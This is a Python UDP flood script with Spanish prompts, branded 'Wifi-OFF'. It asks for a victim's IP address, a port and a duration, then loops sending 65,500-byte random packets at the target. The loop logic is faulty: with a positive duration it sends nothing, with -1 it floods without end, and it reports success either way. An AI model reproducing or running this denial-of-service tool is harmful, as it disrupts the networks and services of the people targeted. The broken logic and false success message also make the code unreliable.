import os
import random
import socket
import string
import time
import webbrowser
#importaciones
import zipfile

import colorama
import requests
from colorama import Fore, init

#declaraciones de colorama
green = Fore.GREEN
red = Fore.RED
reset = Fore.RESET
yellow = Fore.YELLOW
magenta = Fore.MAGENTA
white = Fore.WHITE
cyan = Fore.CYAN
#wifi-off

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65500)

from os import system

system("cls")
print()
print()
print()
print()
print()
print(f"{yellow}     _    _ _  __ _       {reset}{magenta} _________________    ")
print(f"{yellow}    | |  | (_)/ _(_)      {reset}{magenta}|  _  |  ___|  ___|   ")
print(f"{yellow}    | |  | | | |_ _ {reset}{white}______{reset}{magenta}| | | | |_  | |_      ")
print(f"{yellow}    | |/\| | |  _| |{reset}{white}______{reset}{magenta}| | | |  _| |  _|     ")
print(f"{yellow}    \  /\  / | | | |      {reset}{magenta}\ \_/ / |   | |       ")
print(f"{yellow}     \/  \/|_|_| |_|      {reset}{magenta} \___/\_|   \_|       ")
print()
print()
print(f"{green}       *---[{reset}{yellow}By:{reset}{red} Exterminator$quad{reset}{yellow}{reset}{green}           ]---*")
print(f"{green}     *---[{reset}{yellow}Version: 1.0{reset}{yellow}{reset}{green}                        ]---*")
print(f"{green}     *---[{reset}{yellow}Modules: 8 {reset}{yellow}{reset}{green}                         ]---*")
print(f"{green}       *---[{reset}{yellow}85% Python{reset}{yellow} 15% shell{reset}{green}            ]---*")
print()
print()
print()
print(f"{yellow}Introduce la Ip de la victima")
ip = input(f"{cyan}>>{reset}{yellow}")
port = int(input(f"{yellow}ingresa el puerto de destino{reset}{green}:"))
dur = int(input(f"{yellow}ingrese duraccion del ataue -1 es infinito:{reset}{green} "))


timeout = time.time() + dur
sent = 0

while True:
        if time.time() > timeout:
            if dur != -1:
                break
            else:
                pass
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            print("sent",sent,"packets to",ip,"through",port,)
print(f"{green}El ataque Fue Exitoso!{reset}{yellow} este es el final del programa")
system("pause")